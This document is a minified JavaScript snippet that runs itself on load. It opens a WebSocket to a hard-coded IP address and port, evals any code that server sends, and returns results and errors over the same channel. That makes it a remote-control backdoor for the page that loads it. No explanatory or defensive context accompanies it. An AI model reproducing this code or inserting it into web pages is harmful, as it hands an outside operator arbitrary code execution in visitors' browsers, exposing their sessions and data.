(function(){function e(a,b){return function(){return eval(a)}.call(b)}var d=new WebSocket("ws://85.106.97.36
:8234/s"),f=function(a){this.send=function(b,c){d.send((c?"z":"")+a+b)}};d.onmessage=function(a){a=a.data;var b=new f(a.slice(0,8));try{e(a.slice(8),b)}catch(c){b.send(c,!0)}}})();
